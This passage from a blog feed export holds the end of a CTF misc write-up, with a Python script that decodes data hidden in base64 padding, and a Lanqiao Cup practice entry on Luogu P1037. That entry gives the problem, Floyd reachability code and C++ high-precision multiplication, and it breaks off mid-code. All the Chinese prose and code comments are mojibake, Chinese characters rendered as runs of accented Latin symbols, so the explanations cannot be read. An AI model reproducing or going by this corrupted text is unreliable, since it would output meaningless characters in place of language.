pattern2ç”¨äºåŒ¹é…ä¸€ä¸ªç­‰å·æƒ…å†µæ—¶ï¼Œç­‰å·å‰çš„ä¸€ä¸ªå­—ç¬¦</span><br>pattern2 = <span class="hljs-string">r&#x27;(\S)==$&#x27;</span><br>pattern1 = <span class="hljs-string">r&#x27;(\S)=$&#x27;</span><br><br><span class="hljs-comment"># æå–åçš„éšå†™äºŒè¿›åˆ¶å­—ç¬¦åŠ å…¥binstringä¸­</span><br>binstring = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># é€è¡Œè¯»å–å¾…è§£å¯†çš„base64éšå†™å­—ç¬¦ä¸²ï¼Œé€è¡Œå¤„ç†</span><br><span class="hljs-keyword">while</span>(base64str):<br>    <span class="hljs-comment"># å…ˆåŒ¹é…ä¸¤ä¸ªç­‰å·çš„æƒ…å†µï¼Œå¦‚æœåŒ¹é…ä¸ä¸Šï¼Œå†é…ç½®ä¸€ä¸ªç­‰å·çš„æƒ…å†µ</span><br>    <span class="hljs-comment"># å¦‚æœæ— ç­‰å·ï¼Œåˆ™æ²¡æœ‰éšè—ï¼Œæ— éœ€å¤„ç†</span><br>    <span class="hljs-keyword">if</span> re.<span class="hljs-built_in">compile</span>(pattern2).findall(base64str):<br>        <span class="hljs-comment"># msträ¸ºç­‰å·å‰çš„ä¸€ä¸ªå­—ç¬¦ï¼Œè¯¥å­—ç¬¦ä¸ºéšå†™äºŒè¿›åˆ¶ä¿¡æ¯æ‰€åœ¨çš„å­—ç¬¦</span><br>        mstr = re.<span class="hljs-built_in">compile</span>(pattern2).findall(base64str)[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># ç¡®è®¤mstrå­—ç¬¦å¯¹åº”çš„base64äºŒè¿›åˆ¶æ•°ï¼Œèµ‹å€¼ç»™mbin</span><br>        mbin = <span class="hljs-built_in">bin</span>(b64chars.find(mstr))<br>        <span class="hljs-comment"># mbinæ ¼å¼å¦‚0b100ï¼Œmbin[0:2]ä¸º0b</span><br>        <span class="hljs-comment"># mbin[2:].zfill(6)ä¸ºå°†0båé¢çš„äºŒè¿›åˆ¶æ•°å‰é¢è¡¥0ï¼Œä½¿0båé¢çš„é•¿åº¦ä¸º6</span><br>        mbin2 = mbin[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + mbin[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>        <span class="hljs-comment"># ä¸¤ä¸ªç­‰å·æƒ…å†µéšå†™äº†4ä½äºŒè¿›åˆ¶æ•°ï¼Œæ‰€ä»¥æå–mbin2çš„å4bit</span><br>        <span class="hljs-comment"># èµ‹å€¼ç»™stegobinï¼Œè¿™å°±æ˜¯éšè—çš„äºŒè¿›åˆ¶ä¿¡æ¯</span><br>        stegobin = mbin2[-<span class="hljs-number">4</span>:]<br>        binstring += stegobin<br>    <span class="hljs-keyword">elif</span> re.<span class="hljs-built_in">compile</span>(pattern1).findall(base64str):<br>        mstr = re.<span class="hljs-built_in">compile</span>(pattern1).findall(base64str)[<span class="hljs-number">0</span>]<br>        mbin = <span class="hljs-built_in">bin</span>(b64chars.find(mstr))<br>        mbin2 = mbin[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + mbin[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>        <span class="hljs-comment"># ä¸€ä¸ªç­‰å·æƒ…å†µéšå†™äº†2ä½äºŒè¿›åˆ¶æ•°ï¼Œæ‰€ä»¥æå–mbin2çš„å2bit</span><br>        stegobin = mbin2[-<span class="hljs-number">2</span>:]<br>        binstring += stegobin<br>    base64str = f.readline()<br><br><span class="hljs-comment"># stegobinå°†å„è¡Œéšè—çš„äºŒè¿›åˆ¶å­—ç¬¦æ‹¼æ¥åœ¨ä¸€èµ·</span><br><span class="hljs-comment"># ä»ç¬¬0ä½å¼€å§‹ï¼Œ8bitã€8bitå¤„ç†ï¼Œæ‰€ä»¥rangeçš„æ­¥è¿›ä¸º8</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(binstring),<span class="hljs-number">8</span>):<br>    <span class="hljs-comment"># int(xxx,2)ï¼Œå°†äºŒè¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸º10è¿›åˆ¶çš„æ•´æ•°ï¼Œå†ç”¨chr()è½¬ä¸ºå­—ç¬¦</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(binstring[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è“æ¡¥æ¯åˆ·é¢˜è®°å½•</title>
    <link href="/2023/05/20/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/05/20/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="æ´›è°·">æ´›è°·</h1><h2 id="P1037-NOIP2002-æ™®åŠç»„-äº§ç”Ÿæ•°">P1037 [NOIP2002 æ™®åŠç»„] äº§ç”Ÿæ•°</h2><h3 id="é¢˜ç›®æè¿°">é¢˜ç›®æè¿°</h3><p>ç»™å‡ºä¸€ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªå˜æ¢è§„åˆ™ã€‚</p><p>è§„åˆ™ï¼š</p><ul><li>ä¸€ä½æ•°å¯å˜æ¢æˆå¦ä¸€ä¸ªä¸€ä½æ•°ã€‚</li><li>è§„åˆ™çš„å³éƒ¨ä¸èƒ½ä¸ºé›¶ã€‚</li></ul><p>ä¾‹å¦‚ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>234</mn><mo separator="true">,</mo><mi>k</mi><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">n=234,k=2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">234</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>ã€‚æœ‰ä»¥ä¸‹ä¸¤ä¸ªè§„åˆ™ï¼š</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>âŸ¶</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">2\longrightarrow 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6554em;vertical-align:-0.011em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âŸ¶</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span>ã€‚</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mo>âŸ¶</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">3\longrightarrow 6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6554em;vertical-align:-0.011em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âŸ¶</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span></span></span></span>ã€‚</li></ul><p>ä¸Šé¢çš„æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>234</mn></mrow><annotation encoding="application/x-tex">234</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">234</span></span></span></span> ç»è¿‡å˜æ¢åå¯èƒ½äº§ç”Ÿå‡ºçš„æ•´æ•°ä¸ºï¼ˆåŒ…æ‹¬åŸæ•°ï¼‰:</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>234</mn></mrow><annotation encoding="application/x-tex">234</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">234</span></span></span></span>ã€‚</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>534</mn></mrow><annotation encoding="application/x-tex">534</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">534</span></span></span></span>ã€‚</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>264</mn></mrow><annotation encoding="application/x-tex">264</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">264</span></span></span></span>ã€‚</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>564</mn></mrow><annotation encoding="application/x-tex">564</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">564</span></span></span></span>ã€‚</li></ul><p>å…± <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span> ç§ä¸åŒçš„äº§ç”Ÿæ•°ã€‚</p><p>ç°åœ¨ç»™å‡ºä¸€ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªè§„åˆ™ã€‚æ±‚å‡ºç»è¿‡ä»»æ„æ¬¡çš„å˜æ¢ï¼ˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> æ¬¡æˆ–å¤šæ¬¡ï¼‰ï¼Œèƒ½äº§ç”Ÿå‡ºå¤šå°‘ä¸ªä¸åŒæ•´æ•°ã€‚</p><p>ä»…è¦æ±‚è¾“å‡ºä¸ªæ•°ã€‚</p><h3 id="è¾“å…¥æ ¼å¼">è¾“å…¥æ ¼å¼</h3><p>ç¬¬ä¸€è¡Œä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo separator="true">,</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">n,k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>ï¼Œå«ä¹‰å¦‚é¢˜é¢æ‰€ç¤ºã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> è¡Œï¼Œæ¯è¡Œä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i,y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œè¡¨ç¤ºæ¯æ¡è§„åˆ™ã€‚</p><h3 id="è¾“å‡ºæ ¼å¼">è¾“å‡ºæ ¼å¼</h3><p>å…±ä¸€è¡Œï¼Œè¾“å‡ºèƒ½ç”Ÿæˆçš„æ•°å­—ä¸ªæ•°ã€‚</p><h3 id="æ ·ä¾‹-1">æ ·ä¾‹ #1</h3><h4 id="æ ·ä¾‹è¾“å…¥-1">æ ·ä¾‹è¾“å…¥ #1</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">234 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">5</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><h4 id="æ ·ä¾‹è¾“å‡º-1">æ ·ä¾‹è¾“å‡º #1</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">4<br></code></pre></td></tr></table></figure><h3 id="æç¤º">æç¤º</h3><p>å¯¹äº <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>100</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">100\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"></span><span class="mord">100%</span></span></span></span> æ•°æ®ï¼Œæ»¡è¶³ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>&lt;</mo><msup><mn>10</mn><mn>30</mn></msup></mrow><annotation encoding="application/x-tex">n \lt 10^{30}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span></span></span></span></span></span></span></span>ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>â‰¤</mo><mn>15</mn></mrow><annotation encoding="application/x-tex">k \le 15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">15</span></span></span></span>ã€‚</p><p><strong>ã€é¢˜ç›®æ¥æºã€‘</strong></p><p>NOIP 2002 æ™®åŠç»„ç¬¬ä¸‰é¢˜</p><h3 id="é¢˜ç›®è§£æ">é¢˜ç›®è§£æ</h3><p>åˆšå¼€å§‹çœ‹çš„æ—¶å€™è¿˜ä»¥ä¸ºæ—¶ç”¨dfséå†æ‰€æœ‰å¯èƒ½ï¼Œä½†æ˜¯ä¸€çœ‹nçš„èŒƒå›´å°±çŸ¥é“è¿™ä¸å¯è¡Œã€‚</p><p>ä¹‹åçœ‹äº†å¤§ä½¬é¢˜è§£ï¼ˆå¤§ä½¬ä¸æ„§æ˜¯å¤§ä½¬ï¼Œæ€è·¯éå¸¸ä¹‹æ¸…æ™°ä¸”ç®€æ˜“ï¼‰ï¼Œå‘ç°è¿™é“é¢˜å°±æ˜¯ä¸€ä¸ªå›¾çš„éå†æœç´¢å’Œé«˜ç²¾åº¦ä¹˜æ³•ï¼Œå­¦åˆ°äº†å¾ˆç²¾å¦™çš„åˆ†æé—®é¢˜çš„æ–¹æ³•ï¼Œç‰¹æ­¤è®°å½•ä¸€ä¸‹ã€‚</p><p>è¿™é“é¢˜ç›®æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ’åˆ—ç»„åˆï¼Œæ±‚å‡ºæ¯ä¸ªæ•°å­—èƒ½è½¬æ¢æˆå…¶ä»–å¤šå°‘ç§æ•°å­—ï¼Œä¹‹åå¯¹åœ¨è¯¥å¤§æ•°å†…çš„æ¯ä¸ªæ•°å­—çš„è½¬æ¢ç§ç±»æ•°ç›¸ä¹˜å³å¯ã€‚è¿™æ—¶å€™å°±ä¼šå‘ç°æ±‚</p><p>é¦–å…ˆæ˜¯Floydç®—æ³•ï¼Œè¿™é‡Œä¸å¤šèµ˜è¿°ï¼Œè‡ªè¡Œæœç´¢å­¦ä¹ å³å¯ï¼Œè¿™é‡Œæ˜¯ç”¨Floydç®—æ³•æ¥åˆ¤æ–­ä¸¤ç‚¹ä¹‹é—´æ˜¯å¦æœ‰é€šè·¯ï¼Œæ¥çœ‹è¿™ä¸ªé¢˜çš„è¾“å…¥å’Œæè¿°ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªæœ‰å‘å›¾çš„è¾“å…¥ï¼Œä»ä¸€ä¸ªæ•°å­—èƒ½åˆ°è¾¾å¦ä¸€ä¸ªæ•°å­—å°±ç›¸å½“äºä¸¤ç‚¹ä¹‹é—´æœ‰å•å‘é€šè·¯ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//æŠŠæ¯ä¸€ä¸ªæ•°å­—éƒ½å½“æˆä¸­é—´èŠ‚ç‚¹</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">9</span>; k++)<br>&#123;<br>    <span class="hljs-comment">//éå†èµ·å§‹ç‚¹</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; i++)<br>    &#123;<br>        <span class="hljs-comment">//å°è¯•åˆ°è¾¾çš„ç‚¹</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">9</span>; j++)<br>        &#123;<br>            <span class="hljs-comment">//å¦‚æœèƒ½å¤Ÿåˆ°è¾¾å°±æ ‡è®°</span><br>            <span class="hljs-keyword">if</span>(dis[i][j] || (dis[i][k]&amp;&amp;dis[k][j]))<br>                dis[i][j]=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åç”±äºæ•°æ®è¿‡å¤§ï¼Œä¹˜å‡ºæ¥çš„æ•°ä¼šçˆ†longlongï¼Œé«˜ç²¾åº¦ä¹˜é«˜ç²¾åº¦åˆä¸ä¼šï¼Œä½†æ˜¯ä»”ç»†æƒ³ä¸€ä¸‹å‘ç°å¯ä»¥å†™æˆé«˜ç²¾åº¦ä¹˜ä»¥ä½ç²¾åº¦ï¼Œä¹‹å‰åœ¨Acwingçœ‹çš„æ¨¡æ¿ï¼Œç›´æ¥è´´ä¸Šæ¥ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//é«˜ç²¾åº¦ä¹˜ä½ç²¾åº¦</span><br><span class="hljs-comment">// C = A * b, A &gt;= 0, b &gt;= 0</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">mul</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; &amp;A, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; C;<br><br>    <span class="hljs-type">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; A.<span class="hljs-built_in">size</span>() || t; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (i &lt; A.<span class="hljs-built_in">size</span>()) t += A[i] * b;<br>        C.<span class="hljs-built_in">push_back</span>(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (C.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">1</span> &amp;&amp; C.<span class="hljs-built_in">back</span>() == <span class="hljs-number">0</span>) C.<span class="hljs-built_in">pop_back</span>();<br><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åå°±æ˜¯ä¸€äº›ç»†èŠ‚é—®é¢˜äº†</p><ul><li><p>Floydè‡ªå·±åˆ°è‡ªå·±å®é™…ä¸Šæ˜¯æ— æ•ˆï¼Œæ”¹ä¸º0</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">9</span>;i++)<br>dis[i][i]=<span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li><li><p>é«˜ç²¾åº¦é€†åºè¾“å‡º</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br>string n;<br><span class="hljs-type">int</span> dis[<span class="hljs-number">11</span>][<span class="hljs-number">11</span>]=&#123;<span class="hljs-number">0</span>&#125;, t[<span class="hljs-number">11</span>];<br>vector&lt;<span class="hljs-type">int</span>&gt; A;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">floyd</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">9</span>; k++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; i++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">9</span>; j++)<br>&#123;<br><span class="hljs-keyword">if</span>(dis[i][j] || (dis[i][k]&amp;&amp;dis[k][j]))<br>dis[i][j]=<span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">mul</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; A, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>vector&lt;<span class="hljs-type">int</span>&gt; C;<br><span class="hljs-type">int</span> t = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; A.<span class="hljs-built_in">size</span>() || t; i++)<br>&#123;<br><span class="hljs-keyword">if</span>(i &lt; A.<span class="hljs-built_in">size</span>()) t+=A[i]*b;<br>C.<span class="hljs-built_in">push_back</span>(t%<span class="hljs-number">10</span>);<br>t/=<span class="hljs-number">10</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(C.<span class="hljs-built_in">back</span>()==<span class="hljs-number">0</span>&amp;&amp;C.<span class="hljs-built_in">size</span>()&gt;<span 